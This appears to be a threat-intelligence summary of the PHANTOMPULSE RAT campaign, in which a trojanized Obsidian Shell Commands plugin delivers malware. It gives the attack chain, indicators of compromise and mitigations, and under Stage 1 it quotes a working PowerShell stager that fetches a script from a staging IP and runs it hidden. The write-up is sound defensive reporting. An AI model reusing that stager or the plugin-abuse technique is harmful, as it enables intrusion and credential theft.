# PHANTOMPULSE RAT — Obsidian Shell Commands Plugin Abuse (REF6598)
This document describes the PHANTOMPULSE malware campaign (REF6598) discovered
by Elastic Security Labs on April 14, 2026. Threat actors abuse Obsidian's
community plugin ecosystem to deliver a novel AI-assisted Windows RAT.

## Attack Chain

The attackers pose as venture capital representatives on LinkedIn, move targets
to Telegram, and provide credentials to a pre-staged Obsidian vault. Once the
victim enables community plugin sync, the trojanized Shell Commands plugin
(data.json) executes attacker-controlled PowerShell on vault open.

### Stage 1 — Shell Commands plugin payload (Windows)

The data.json Shell Commands configuration executes Base64-encoded PowerShell:

```
iwr http://195.3.222.251/script1.ps1 -OutFile $env:TEMP\tt.ps1 -UseBasicParsing
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "$env:TEMP\tt.ps1"
```

### Stage 2 — PHANTOMPULL loader delivery

The script1.ps1 loader uses BitsTransfer to download syncobs.exe and reports
status to the C2 at 195.3.222.251/stuk-phase with tags (GLAUNCH SUCCESS,
RLAUNCH FAILED, GSESSION CLOSED).

### Stage 3 — PHANTOMPULSE RAT

PHANTOMPULL AES-256-CBC-decrypts and reflectively loads PHANTOMPULSE via
DllRegisterServer. PHANTOMPULSE features:
- Blockchain-based C2 resolution via Ethereum wallet 0xc117688c530b660e15085bF3A2B664117d8672aA
- C2 panel: panel.fefea22134.net
- Process injection via module stomping (PhantomInject)
- Keylogging, screen capture, UAC bypass
- macOS variant with AppleScript dropper and Telegram fallback C2 (0x666.info)

## Indicators of Compromise

- Staging server: 195.3.222.251
- C2 panel domain: panel.fefea22134.net
- macOS C2 domain: 0x666.info
- Ethereum C2 wallet: 0xc117688c530b660e15085bF3A2B664117d8672aA
- Loader binary: syncobs.exe (SHA-256: 70bbb38b70fd836d66e8166ec27be9aa8535b3876596fc80c45e3de4ce327980)
- Final payload SHA-256: 33dacf9f854f636216e5062ca252df8e5bed652efd78b86512f5b868b11ee70f
- Plugin config: .obsidian/plugins/obsidian-shellcommands/data.json

## Mitigation

Remove the obsidian-shellcommands plugin from all devices, revoke all credentials
stored on affected machines, and check for syncobs.exe in %TEMP%. Monitor for
anomalous child process creation from Obsidian.exe or Obsidian (macOS).

## References

- Elastic Security Labs: https://www.elastic.co/security-labs/phantom-in-the-vault
- The Hacker News: https://thehackernews.com/2026/04/obsidian-plugin-abuse-delivers.html
- SOC Prime: https://socprime.com/active-threats/vault-obsidian-abused-to-deliver-phantompulse-rat/
